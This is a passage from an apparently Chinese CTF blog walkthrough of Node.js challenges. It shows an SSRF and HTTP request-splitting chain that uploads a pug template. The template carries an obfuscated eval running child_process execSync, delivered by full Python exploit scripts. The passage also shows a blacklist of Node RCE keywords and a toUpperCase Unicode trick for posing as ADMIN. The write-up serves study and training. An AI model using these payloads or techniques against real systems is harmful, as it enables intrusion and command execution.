     <span class="hljs-built_in">console</span>.log(url)<br>        <span class="hljs-keyword">var</span> trigger = blacklist(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.send(<span class="hljs-string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                http.get(url, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) </span>&#123;<br>                    resp.setEncoding(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>&#123;<br>                        <span class="hljs-keyword">if</span> (err.code === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                    &#125;);<br><br>                    resp.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) </span>&#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            resps = chunk.toString();<br>                            res.send(resps);<br>                        &#125;<span class="hljs-keyword">catch</span> (e) &#123;<br>                            res.send(e.message);<br>                        &#125;<br><br>                    &#125;).on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                        res.send(e.message);&#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-built_in">console</span>.log(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">url</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;mainModule&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;child_process&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.includes(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>审计完上面代码，可以有如下的攻击思路：</p>
+<p>1.利用<code>/core</code>路由存在的SSRF漏洞，伪造成服务端去访问<code>/file_upload</code>路由，这样就可以绕过关于<code>IP</code>的限制，然后利用文件上传功能，任意上传文件。</p>
+<p>2.利用<code>/</code>路由下的pug引擎渲染解析我们上传的恶意文件来进行攻击。</p>
+<p>比如构造一个<code>任意文件包含的</code>恶意文件。</p>
+<p><a target="_blank" rel="noopener" href="https://www.pugjs.cn/language/includes.html">https://www.pugjs.cn/language/includes.html</a></p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/4.png" srcset="/img/loading.gif"></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">doctype html<br>html<br>  head<br>    style<br>      <span class="hljs-keyword">include</span> ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag.txt<br></code></pre></td></tr></table></figure>
+<p>pug引擎也可以解析<code>js</code>的代码，因此也可以利用js代码执行任意命令。</p>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scilab">-var x = eval(<span class="hljs-string">&quot;glob&quot;</span>+<span class="hljs-string">&quot;al.proce&quot;</span>+<span class="hljs-string">&quot;ss.mainMo&quot;</span>+<span class="hljs-string">&quot;dule.re&quot;</span>+<span class="hljs-string">&quot;quire(&#x27;</span>child_&#x27;+<span class="hljs-string">&#x27;pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>).toString()<span class="hljs-string">&quot;)</span><br><span class="hljs-string">-return x</span><br></code></pre></td></tr></table></figure>
+<p>利用方法：上传文件修改如下数据，其中<code>Content-Length</code>的这个值的是等于请求包的<code>Body</code>部分经过<code>\n</code>—&gt;<code>\r\n</code>替换后的长度，需要注意。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/6.png" srcset="/img/loading.gif"></p>
+<p>构造后如下：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-keyword">Connection</span>: keep-alive<br><br>POST /file_upload HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Content-Length: <span class="hljs-number">332</span><br>Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">----WebKitFormBoundarformyZ6whwJgp4Dzq08bu</span><br><br><span class="hljs-comment">------WebKitFormBoundarformyZ6whwJgp4Dzq08bu</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;node.pug&quot;<br>Content-<span class="hljs-keyword">Type</span>: ../<span class="hljs-keyword">template</span><br><br>-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)<br>-<span class="hljs-keyword">return</span> x<br><span class="hljs-comment">------WebKitFormBoundarformyZ6whwJgp4Dzq08bu--</span><br><br><span class="hljs-keyword">GET</span> /<br></code></pre></td></tr></table></figure>
+<p>接下来我们需要将其编码一下，用赵总的编码语句。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)<br></code></pre></td></tr></table></figure>
+<p>根据网上的脚本修改了一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarformyZ6whwJgp4Dzq08bu</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;GET /&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>body = <span class="hljs-string">&quot;&quot;&quot;------WebKitFormBoundarformyZ6whwJgp4Dzq08bu</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;node.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">------WebKitFormBoundarformyZ6whwJgp4Dzq08bu--</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(body), body)<br>payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)<span class="hljs-comment">#这一句是利用该漏洞的关键。</span><br><br>print(payload)<br>requests.get(<span class="hljs-string">&#x27;http://73c7f9b0-4b05-4574-b5e7-edf1ffb61547.node3.buuoj.cn/core?q=&#x27;</span> + payload)<br><br>print(requests.get(<span class="hljs-string">&#x27;http://73c7f9b0-4b05-4574-b5e7-edf1ffb61547.node3.buuoj.cn/?action=node&#x27;</span>).text)<br><br><br><br><br><br><span class="hljs-comment"># doctype html</span><br><span class="hljs-comment"># html</span><br><span class="hljs-comment">#   head</span><br><span class="hljs-comment">#     style</span><br><span class="hljs-comment">#       include ../../../../../../../flag.txt</span><br><br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;&quot;&quot;HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarformyZ6whwJgp4Dzq08bu</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;GET /&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>body = <span class="hljs-string">&quot;&quot;&quot;------WebKitFormBoundarformyZ6whwJgp4Dzq08bu</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;node.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">------WebKitFormBoundarformyZ6whwJgp4Dzq08bu--</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(body), body)<br>print(payload)<br><span class="hljs-comment"># payload = &#x27;&#x27;.join(chr(int(&#x27;0xff&#x27; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br>payload = payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(body), body) \<br>    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>) <br>print(payload)<br>requests.get(<span class="hljs-string">&#x27;http://73c7f9b0-4b05-4574-b5e7-edf1ffb61547.node3.buuoj.cn/core?q=&#x27;</span> + payload)<br><br>print(requests.get(<span class="hljs-string">&#x27;http://73c7f9b0-4b05-4574-b5e7-edf1ffb61547.node3.buuoj.cn/?action=node&#x27;</span>).text)<br><br><br><span class="hljs-comment"># doctype html</span><br><span class="hljs-comment"># html</span><br><span class="hljs-comment">#   head</span><br><span class="hljs-comment">#     style</span><br><span class="hljs-comment">#       include ../../../../../../../flag.txt</span><br><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/5.png" srcset="/img/loading.gif"></p>
+<p>拿到flag</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6462.html">https://www.zhaoj.in/read-6462.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/104474414">https://blog.csdn.net/qq_42181428/article/details/104474414</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://pugjs.org/zh-cn/language/includes.html">https://pugjs.org/zh-cn/language/includes.html</a></p>
+<h1 id="2-GYCTF2020-Ez-Express"><a href="#2-GYCTF2020-Ez-Express" class="headerlink" title="2.[GYCTF2020]Ez_Express"></a>2.[GYCTF2020]Ez_Express</h1><p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/7.png" srcset="/img/loading.gif"></p>
+<p>还是源代码泄露，我们着重看<code>index.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br><span class="hljs-keyword">const</span> merge = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> clone = <span class="hljs-function">(<span class="hljs-params">a</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(!req.session.user)&#123;<br>    res.redirect(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.outputFunctionName=<span class="hljs-literal">undefined</span>;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.session.user.user&#125;);<br>&#125;);<br><br><br>router.get(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br><br><br>router.post(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(safeKeyword(req.body.userid))&#123;<br>    res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.session.user=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.session.user)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;<br>      req.session.user.isLogin=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br>router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router;<br><br></code></pre></td></tr></table></figure>
+<p>还是分块审计：</p>
+<p>第一块是<code>safeKeyword</code>函数，是用来检查传入的<code>keyword</code>参数值是否含有<code>admin</code>字符串（不区分大小写）。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>第二块是<code>/</code>路由，接受GET方法的请求，如果没有用户会话，则重定向到<code>/login</code>路由。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(!req.session.user)&#123;<br>    res.redirect(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.outputFunctionName=<span class="hljs-literal">undefined</span>;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.session.user.user&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+<p>第三块是<code>/login</code>路由，接受POST方法的请求，</p>
+<p>如果先提交一个注册请求，如果我们传入的注册用户名<code>userid</code>经过<code>safeKeyword</code>函数的检验的话，则将我们的注册信息（用户名、密码、登录状态）写入<code>session</code>中，然后跳转到<code>/</code>。</p>
+<p>如果提交登陆请求，如果没有存在用户会话的话，则弹出需要<code>register first</code>的提示框。</p>
+<p><strong>其中<code> &#39;user&#39;:req.body.userid.toUpperCase()</code> 这一句中<code>toUpperCase()</code>函数是为了将字符串中的小写字符转换成大写，但因为javascript的特性，函数存在分险（下图），所以假如我们传入<code>admın</code>的话，经过<code>toUpperCase()</code>的处理后，会变成<code>ADMIN</code></strong></p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/9.png" srcset="/img/loading.gif"></p>
+<blockquote>
+<p>在javascript中有几个特殊的字符需要记录一下</p>
+<p>对于toUpperCase():</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">字符<span class="hljs-string">&quot;ı&quot;</span>、<span class="hljs-string">&quot;ſ&quot;</span> 经过<span class="hljs-keyword">to</span>UpperCase处理后结果为 <span class="hljs-string">&quot;I&quot;</span>、<span class="hljs-string">&quot;S&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>对于toLowerCase():</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">字符<span class="hljs-string">&quot;K&quot;</span>经过toLowerCase处理后结果为<span class="hljs-string">&quot;k&quot;</span><span class="hljs-comment">(这个K不是K)</span><br></code></pre></td></tr></table></figure>
+
+<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js">router.post(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(safeKeyword(req.body.userid))&#123;<br>    